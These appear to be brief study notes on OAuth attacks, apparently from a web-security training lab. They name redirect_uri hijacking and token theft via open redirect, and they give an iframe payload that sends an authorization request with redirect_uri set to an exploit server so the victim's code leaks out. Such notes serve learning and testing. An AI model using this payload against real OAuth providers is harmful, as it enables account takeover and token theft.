# OAUTH

- **hijacking via redirect_uri**
- **Stealing OAuth access tokens via an open redirect**

```jsx
<iframe src="https://oauth-0a2b00fd0306e8c3868c1ef302f100bc.oauth-server.net/auth?client_id=f5ajjz3hdwlebpflpzont&redirect_uri=https://exploit-0a57000e0330e8c986ec1f1d016a0040.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```